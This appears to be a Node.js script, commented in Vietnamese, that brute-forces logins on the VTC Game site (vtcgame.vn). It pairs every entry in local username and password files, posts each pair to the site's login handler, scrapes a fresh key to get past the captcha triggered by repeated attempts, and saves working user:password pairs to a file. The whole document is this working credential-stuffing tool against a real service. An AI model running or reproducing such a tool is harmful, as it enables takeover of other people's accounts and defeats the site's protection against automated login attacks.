// Tao 1 form Login
// Login nhieu se bi dinh captcha
// Khi dinh captcha, get url https://header.vtcgame.vn/home/commonv2, tim den $("#key").val()
// Lay key xong axios dang nhap cung voi key vua get
// Kiem tra key bi het han hoac nhap nhieu lan, doi key khac nhu buoc 3

const cheerio = require('cheerio')
const axios = require('axios')
const fs = require("async-file")
const fset = require("fs")

async function getKey() {
    try {
        let getUrl = await axios({
            method: 'get',
            url: 'https://header.vtcgame.vn/home/commonv2',
            headers: {
                'Connection': 'keep - alive',
                'Accept': '*/*',
                'Origin': 'https://vtcgame.vn',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36',
                'Referer': 'https://vtcgame.vn/nap-vcoin/qua-the-cao.html',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
            }
        })
        const $ = cheerio.load(getUrl.data)
        return {
            key: $("#key").val(),
            headers: getUrl.headers
        }
    } catch (error) {
        throw new Error('Khong the get key: '+error)
    }

}

async function doLogin(user, pass, cookieSession, key) {
    try {
        let login = await axios({
            method: 'POST',
            url: 'https://header.vtcgame.vn/Handler/Process.ashx?act=Login',
            headers: {
                'Origin': 'https://vtcgame.vn',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US, en; q=0.9',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://vtcgame.vn/nap-vcoin/qua-the-cao.html',
                'Cookie': 'ASP.NET_SessionId='+cookieSession,
            },
            timeout: 5000,
            data: 'conten=' + new Buffer(user).toString("base64") + '&value=' + new Buffer(pass).toString("base64") +'&capt=&hidverify=&isRemember=false&key='+key+'&otp=&otpType=1&returnURL=http%3A%2F%2Flocalhost%3A3955%2F:'
        })
        return login.data
    } catch (error) {
        console.log(error)
    }
}

async function tryLogin(user, pass) {
    try {
        let getKeyandHeaders = await getKey()
        var cookieSession = new RegExp('[; ]ASP.NET_SessionId=([^\\s;]*)');
        cookieSession = (' ' + getKeyandHeaders.headers["set-cookie"][0]).match(cookieSession);
        cookieSession = unescape(cookieSession[1]);
        let doItLogin = await doLogin(user, pass, cookieSession, getKeyandHeaders.key)
        if (doItLogin.ResponseStatus == 999) {
            done(user+':'+pass)
        }
    } catch (error) {
        console.log(error)
    }
}

async function done(data) {
    fset.open('./doneVTC.txt', 'a', 755, function (e, id) {
        fset.write(id, data + "\r\n", null, 'utf8', function () {
            fset.close(id, function () {
                console.log('Success: ' + data);
            });
        });
    })
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

(async () => {
    try {
        let user = await fs.readFile('./user.txt', { encoding: 'utf8' });
        let pass = await fs.readFile('./pass.txt', { encoding: 'utf8' });

        user = user.split(/\r?\n/);
        pass = pass.split(/\r?\n/);

        for (let i = 0; i < user.length; i++) {
            const username = user[i];
            for (let j = 0; j < pass.length; j++) {
                const password = pass[j];
                tryLogin(username, password)
                console.log("Checking: "+username+':'+password)
                sleep(500)
            }
        }

    } catch (error) {
        console.log(error)
    }
})()